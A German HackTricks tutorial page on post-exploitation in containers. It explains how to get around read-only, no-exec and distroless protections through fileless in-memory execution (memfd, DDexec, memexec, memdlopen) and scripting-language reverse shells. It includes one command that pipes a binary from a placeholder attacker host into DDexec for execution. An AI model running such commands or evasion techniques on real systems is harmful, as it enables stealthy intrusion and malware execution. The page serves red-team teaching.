# Bypass von FS-Schutzmaßnahmen: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Videos

In den folgenden Videos werden die in dieser Seite erwähnten Techniken ausführlicher erklärt:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec Szenario

Es ist immer häufiger, linux-Maschinen mit **read-only (ro) file system protection** vorzufinden, besonders in Containern. Das liegt daran, dass ein Container mit ro-Dateisystem so einfach läuft, wie man **`readOnlyRootFilesystem: true`** im `securitycontext` setzt:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Selbst wenn das Dateisystem als ro gemountet ist, bleibt **`/dev/shm`** weiterhin beschreibbar, sodass es nicht stimmt, dass man nichts auf die Platte schreiben kann. Dieses Verzeichnis wird jedoch mit **no-exec protection** gemountet, sodass, wenn du hier ein binary herunterlädst, du es **nicht ausführen kannst**.

> [!WARNING]
> Aus Sicht eines Red Teams erschwert das das **Herunterladen und Ausführen** von binaries, die nicht bereits im System vorhanden sind (wie backdoors oder enumerators wie `kubectl`).

## Easiest bypass: Scripts

Beachte, dass ich binaries erwähnt habe. Du kannst **jedes Script** ausführen, solange der Interpreter auf der Maschine vorhanden ist, z. B. ein **shell script**, wenn `sh` vorhanden ist, oder ein **python script**, wenn `python` installiert ist.

Das allein reicht jedoch nicht aus, um deinen binary backdoor oder andere binary-Tools auszuführen, die du möglicherweise benötigst.

## Memory Bypasses

Wenn du ein binary ausführen willst, das Dateisystem dies aber nicht zulässt, ist der beste Weg, es **aus dem memory auszuführen**, da die **Schutzmaßnahmen dort nicht greifen**.

### FD + exec syscall bypass

Wenn du leistungsfähige Script-Engines auf der Maschine hast, wie **Python**, **Perl** oder **Ruby**, könntest du das binary herunterladen, um es aus dem Memory auszuführen, es in einem Memory-File-Descriptor (`create_memfd` syscall) speichern — der von diesen Schutzmaßnahmen nicht betroffen ist — und dann einen **`exec` syscall** aufrufen, der den **fd als auszuführende Datei** angibt.

Dafür kannst du einfach das Projekt [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) verwenden. Du gibst ihm ein binary und es generiert ein Script in der gewählten Sprache mit dem **binary komprimiert und b64 encoded**, inklusive Anweisungen, es in einem **fd** (erstellt durch den `create_memfd` syscall) zu **dekodieren und zu dekomprimieren** und einen **exec syscall** aufzurufen, um es auszuführen.

> [!WARNING]
> Das funktioniert nicht in anderen Scripting-Sprachen wie PHP oder Node, da diese keine d**efault way to call raw syscalls** aus einem Script bieten, sodass es nicht möglich ist, `create_memfd` aufzurufen, um das **memory fd** zum Speichern des binary zu erstellen.
>
> Außerdem funktioniert es nicht, einen **regulären fd** mit einer Datei in `/dev/shm` zu erstellen, da du diese nicht ausführen darfst, weil die **no-exec protection** greift.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ist eine Technik, die es dir erlaubt, den Memory deines eigenen Prozesses zu **modifizieren**, indem du dessen **`/proc/self/mem`** überschreibst.

Indem du also den ausgeführten Assembly-Code kontrollierst, kannst du einen **shellcode** schreiben und den Prozess "mutate", um **beliebigen Code auszuführen**.

> [!TIP]
> **DDexec / EverythingExec** ermöglicht es dir, deinen eigenen **shellcode** oder **jedes binary** aus dem **memory** zu laden und auszuführen.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Für weitere Informationen zu dieser Technik siehe Github oder:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ist der natürliche nächste Schritt von DDexec. Es ist ein **DDexec shellcode demonised**, sodass du jedes Mal, wenn du **ein anderes Binary ausführen** möchtest, DDexec nicht neu starten musst; du kannst einfach memexec-Shellcode über die DDexec-Technik ausführen und dann **mit diesem daemon kommunizieren, um neue Binaries zum Laden und Ausführen zu übergeben**.

Ein Beispiel dafür, wie man **memexec verwendet, um Binaries aus einer PHP reverse shell auszuführen**, findest du in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Mit einem ähnlichen Zweck wie DDexec ermöglicht die Technik [**memdlopen**](https://github.com/arget13/memdlopen) einen **einfacheren Weg, Binaries in den Speicher zu laden**, um sie später auszuführen. Sie kann sogar das Laden von Binaries mit Abhängigkeiten erlauben.

## Distroless Bypass

Für eine ausführliche Erklärung, **was distroless eigentlich ist**, wann es hilft, wann nicht, und wie es die Post-Exploitation-Taktiken in Containern verändert, siehe:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless-Container enthalten nur die **minimal notwendigen Komponenten, um eine bestimmte Anwendung oder einen Dienst auszuführen**, wie Bibliotheken und Laufzeitabhängigkeiten, schließen jedoch größere Komponenten wie einen Paketmanager, eine Shell oder System-Utilities aus.

Das Ziel von Distroless-Containern ist es, die Angriffsfläche zu **reduzieren, indem unnötige Komponenten entfernt werden**, und die Anzahl der ausnutzbaren Schwachstellen zu minimieren.

### Reverse Shell

In einem Distroless-Container findest du möglicherweise **nicht einmal `sh` oder `bash`**, um eine normale Shell zu erhalten. Ebenfalls fehlen können Binärdateien wie `ls`, `whoami`, `id`... also alles, was du normalerweise auf einem System ausführst.

> [!WARNING]
> Daher wirst du **nicht** in der Lage sein, eine **reverse shell** zu erhalten oder das System wie gewohnt zu **enumerate**.

Wenn der kompromittierte Container z. B. eine flask-Webanwendung betreibt, ist Python installiert und du kannst daher eine **Python reverse shell** bekommen. Läuft er mit Node, kannst du eine Node rev shell bekommen, und das Gleiche gilt für praktisch jede **scripting language**.

> [!TIP]
> Mit der scripting language kannst du das System mithilfe der Sprachfunktionen **enumerate**.

Wenn **keine `read-only/no-exec`**-Schutzmaßnahmen vorhanden sind, könntest du deine reverse shell missbrauchen, um **deine Binaries ins Dateisystem zu schreiben** und sie **auszuführen**.

> [!TIP]
> In dieser Art von Containern sind diese Schutzmechanismen jedoch in der Regel vorhanden, aber du könntest die **vorherigen Memory-Execution-Techniken verwenden, um sie zu umgehen**.

Beispiele dafür, wie man **einige RCE-Schwachstellen ausnutzt**, um scripting languages **reverse shells** zu bekommen und Binaries aus dem Speicher auszuführen, findest du in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
